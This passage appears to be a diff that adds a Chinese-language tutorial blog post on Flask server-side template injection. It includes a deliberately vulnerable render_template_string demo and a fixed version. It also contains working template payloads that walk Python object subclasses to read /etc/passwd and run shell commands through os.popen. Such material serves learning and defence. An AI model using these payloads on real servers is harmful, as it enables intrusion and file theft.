class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;xrange&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;dict&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;set&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;slice&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;staticmethod&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;complex&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;float&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;buffer&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;long&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;frozenset&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;property&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;memoryview&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;tuple&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;enumerate&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;reversed&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;code&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;frame&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;builtin_function_or_method&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;instancemethod&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;function&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;classobj&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;dictproxy&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;generator&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;getset_descriptor&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;wrapper_descriptor&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;instance&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;ellipsis&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;member_descriptor&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;file&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;PyCapsule&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;cell&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;callable-iterator&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;iterator&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;sys.long_info&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;sys.float_info&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;EncodingMap&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;fieldnameiterator&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;formatteriterator&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;sys.version_info&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;sys.flags&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;exceptions.BaseException&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;module&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;imp.NullImporter&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;zipimport.zipimporter&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;posix.stat_result&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">type&lt;/span> &lt;span class="s1">&amp;#39;posix.statvfs_result&amp;#39;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">class&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nc">warnings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">WarningMessage&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">warnings&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">catch_warnings&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_weakrefset&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_IterationGuard&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_weakrefset&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">WeakSet&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_abcoll&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Hashable&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="nb">classmethod&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_abcoll&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Iterable&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_abcoll&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Sized&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_abcoll&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Container&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">_abcoll&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Callable&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="n">dict_keys&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="n">dict_items&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="n">dict_values&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">site&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_Printer&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">site&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_Helper&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="n">_sre&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SRE_Pattern&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="n">_sre&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SRE_Match&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;type &amp;#39;&lt;/span>&lt;span class="n">_sre&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SRE_Scanner&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">site&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Quitter&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">codecs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">IncrementalEncoder&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;&lt;/span>&lt;span class="n">codecs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">IncrementalDecoder&lt;/span>&lt;span class="s1">&amp;#39;&amp;gt;] &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 可以看到有一个`&amp;lt;type &amp;#39;file&amp;#39;&amp;gt;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># payload:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[40](&amp;#39;/etc/passwd&amp;#39;).read()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="直接的-xss-注入">直接的 XSS 注入
+&lt;/h2>&lt;p>ssti.py&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">flask&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">render_template_string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">app&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Flask&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/test/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">html&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> &amp;lt;h3&amp;gt;&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s1">&amp;lt;/h3&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> &amp;#39;&amp;#39;&amp;#39;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># run the app in localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>直接 python3 运行这个文件即可&lt;/li>
+&lt;/ul>
+&lt;p>正常使用：
+&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240921194704.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>==注入==：
+&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240921194643.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>修改代码以避免直接的 XSS 注入：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/test/&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;h1&amp;gt;{{ code }}&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">code&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>用 &lt;code>{{}}&lt;/code> 传递变量，&lt;strong>模板引擎&lt;/strong>会对渲染的变量进行编码转义，所以不会执行恶意脚本，仅回显脚本内容&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="模板注入">模板注入
+&lt;/h2>&lt;ul>
+&lt;li>文件读取/命令执行&lt;/li>
+&lt;/ul>
+&lt;p>&lt;code>{{}}&lt;/code>并不仅仅可以传递变量，还可以执行一些简单的表达式。&lt;/p>
+&lt;p>以上一个 part 的 ssti.py 代码为例，注入 &lt;code>id={{2*4}}&lt;/code> :
+&lt;img src="https://bu44er.ink/img/Pasted%20image%2020240924100108.png"
+loading="lazy"
+>
+&lt;code> 一般思路：找到父类&lt;/code>&amp;lt;type &amp;lsquo;object&amp;rsquo;&amp;gt;`&amp;ndash;&amp;gt;寻找子类&amp;ndash;&amp;gt;找关于命令执行或者文件操作的模块&lt;/p>
+&lt;h3 id="手工-payload">手工 payload
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># 先 {{&amp;#39;&amp;#39;.__class__.__mro__[1].__subclasses__()}} 找子类
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># index 函数返回子类的索引
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{{&lt;/span>&lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__mro__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">index&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[].&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">__init__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__globals__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">keys&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">index&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">linecache&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># classified by subclasses
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"># class warnings.catch_warnings -&amp;gt; linecache -&amp;gt; os
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="p">{{[].&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">__init__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">func_globals&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">keys&lt;/span>&lt;span class="p">()}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{[].&lt;/span>&lt;span class="n">__class__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">__init__&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">func_globals&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">values&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nf">__import__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;os&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ls&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
